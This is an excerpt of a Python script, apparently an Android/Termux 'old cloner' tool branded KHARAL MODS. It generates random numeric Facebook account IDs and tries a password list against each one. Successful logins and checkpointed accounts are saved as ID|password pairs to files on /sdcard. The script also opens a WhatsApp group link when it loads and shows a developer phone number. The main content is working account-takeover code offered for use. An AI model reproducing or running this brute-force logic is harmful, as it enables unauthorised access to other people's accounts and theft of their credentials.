...
class OLD_CLONER:
    def __init__(self):
        ...
        self.gen = []
    #---jone 
    print ("K|H|A|R|A|L| |M|O|D|S")
    os.system(" xdg-open https://chat.whatsapp.com/LJRRwfpwnHV7XHVeaRy9Sz")
    def banner(self):
        os.system("clear")
        print("DEVELOPER  : KHARAL MODS OFFICIAL")
        print("GITHUB     : KM TOOLS 94")
        print("WHATSAPP :03029750130")
    ...
    def oldClone(self,series):
        ...
        for a in range(limit):
            KHARAL = "".join(random.choice(string.digits) for _ in range(self.uG))
            self.gen.append(KHARAL)
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mKHARAL-XD {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                ...
                if "access_token" in response:
                    ...
                    open("/sdcard/KHARAL-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r\x1b[38;5;196mOLD-CP • {ids} • {pas}")
                    open("/sdcard/KHARAL-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
